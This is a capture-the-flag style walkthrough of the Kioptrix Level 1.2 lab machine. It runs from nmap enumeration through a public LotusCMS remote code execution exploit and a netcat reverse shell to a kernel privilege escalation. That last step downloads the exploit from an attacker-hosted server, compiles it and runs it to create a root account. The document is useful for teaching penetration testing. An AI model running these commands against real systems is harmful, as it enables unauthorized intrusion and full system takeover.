# Kioptrix: Level 1.2

- **Machine:** Kioptrix: Level 1.2
- **Download:** https://www.vulnhub.com/entry/kioptrix-level-12-3,24/

![](791-1.png)

---

# Machine Setup

1. Extract the downloaded archive.
2. Create a **new virtual machine** in VirtualBox.

![](791-2.png)

3. Place the provided `.vmdk` file inside the VM directory.

![](791-3.png)

4. Open the VM **Settings**.
5. Remove the **Empty** optical drive from the IDE controller.
6. Click **Add Hard Disk** and select the provided `.vmdk` file.

![](791-4.png)

![](791-5.png)

7. After selecting the disk, click **Choose**.
8. Configure the network adapter as **Bridged Adapter**.
9. Start the virtual machine.

![](791-6.png)

---

# Network Scanning

## Discover the Target IP

```bash
nmap -sn 192.168.2.0/24
```

![](791-7.png)

---

## Full Nmap Scan

Run a complete scan to enumerate ports, services, operating system information, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.181
```

![](791-8.png)

---

## Optional Port Scan

```bash
nmap -v -p- 192.168.2.181
```

```bash
nmap -sC -sV -A 192.168.2.181
```

---

## HTTP Enumeration

Use the `http-enum` NSE script to identify hidden web resources.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.181
```

![](791-9.png)

---

# Web Enumeration

Visit the target in your browser.

- http://192.168.2.181

On the login page, notice the footer displaying:

> **Proudly Powered by: LotusCMS**

![](791-10.png)

This indicates the website is running **LotusCMS**, which is known to have publicly available exploits.

Search for available exploits.

```bash
searchsploit LotusCMS
```

![](791-11.png)

---

# Initial Access (LotusCMS RCE)

Search for the LotusCMS exploit.

```text
https://github.com/Hood3dRob1n/LotusCMS-Exploit
```

Clone the exploit repository.

```bash
git clone https://github.com/Hood3dRob1n/LotusCMS-Exploit
```

![](791-12.png)

Execute the exploit.

```bash
./lotusRCE.sh 192.168.2.181 /
```

Start a Netcat listener.

```bash
nc -lvnp 443
```

![](791-13.png)

Choose option **1** when prompted.

A reverse shell is obtained.

![](791-14.png)

The shell is non-interactive.

---

## Upgrade the Shell

Spawn a fully interactive TTY shell.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

![](791-15.png)

---

# Privilege Escalation

Gather system information.

```bash
uname -a
```

![](791-16.png)

The kernel version is vulnerable to a known local privilege escalation exploit.

Search for a suitable exploit.

```bash
searchsploit Linux Kernel 2.6.24-24 privilege escalation
```

![](791-17.png)

---

## Prepare the Exploit

Create a temporary directory.

```bash
mkdir /tmp/share
```

```bash
cd /tmp/share
```

Copy the exploit locally.

```bash
searchsploit -m linux/local/40839.c
```

![](791-18.png)

Start a Python web server to transfer the exploit.

```bash
python -m http.server 8080
```

![](791-19.png)

---

## Transfer the Exploit

On the target machine:

```bash
cd /tmp
```

Download the exploit.

```bash
wget http://192.168.2.219:8080/40839.c
```

![](791-20.png)

Compile the exploit.

```bash
gcc 40839.c -o expo -lcrypt -lpthread
```

Make it executable.

```bash
chmod +x expo
```

Run the exploit.

```bash
./expo
```

When prompted, enter a new password.

```text
12345
```

![](791-21.png)

The exploit creates a new root user.

```text
firefart:fi3LLch28IK7A:0:0:pwned:/root:/bin/bash
```

---

# Root Access

Login using the newly created root account.

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa firefart@192.168.2.181
```

![](791-22.png)

Root access is successfully obtained.

---

# Key Learning

- Identify the underlying CMS during web enumeration.
- Search for public exploits using **SearchSploit**.
- Upgrade reverse shells to fully interactive TTYs.
- Enumerate kernel versions after obtaining initial access.
- Use **SearchSploit** to identify local privilege escalation vulnerabilities.
- Transfer exploits using a temporary Python HTTP server.
- Compile and execute local exploits directly on the target.
- Gain persistent root access by creating a privileged account.

---

# Summary

The engagement began with identifying a **LotusCMS** installation through web enumeration. A publicly available **LotusCMS Remote Code Execution (RCE)** exploit was used to obtain an initial reverse shell. After upgrading the shell to a fully interactive TTY, kernel enumeration revealed a vulnerable Linux version. A known local privilege escalation exploit was transferred, compiled, and executed on the target, creating a new root user. Finally, SSH access was established using the newly created account, resulting in full system compromise.